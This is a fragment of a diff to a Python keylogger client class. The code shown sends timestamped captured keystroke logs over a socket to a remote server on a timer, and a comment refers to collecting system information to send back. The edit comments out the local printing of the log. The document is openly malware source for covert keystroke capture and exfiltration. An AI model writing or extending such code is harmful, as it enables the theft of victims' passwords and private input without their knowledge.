@@ -42,7 +42,8 @@ class KeyloggerClient:
     # send logs server
     def send_logs(self):
         self.sock2.send(f"{strftime('%Y-%m-%d %H:%M:%S', gmtime())}: {self.log}\n".encode())
-        print(self.log)
+        # if you want to see the logs live
+        # print(self.log)
         self.log = ""
 
 
@@ -53,7 +54,6 @@ class KeyloggerClient:
             while not self._stop_keylogger_event.is_set():
                 self.send_logs()
                 time.sleep(self.interval)
-            #keyboard_listener.join()
 
 
     # get system information to be sent back to the server
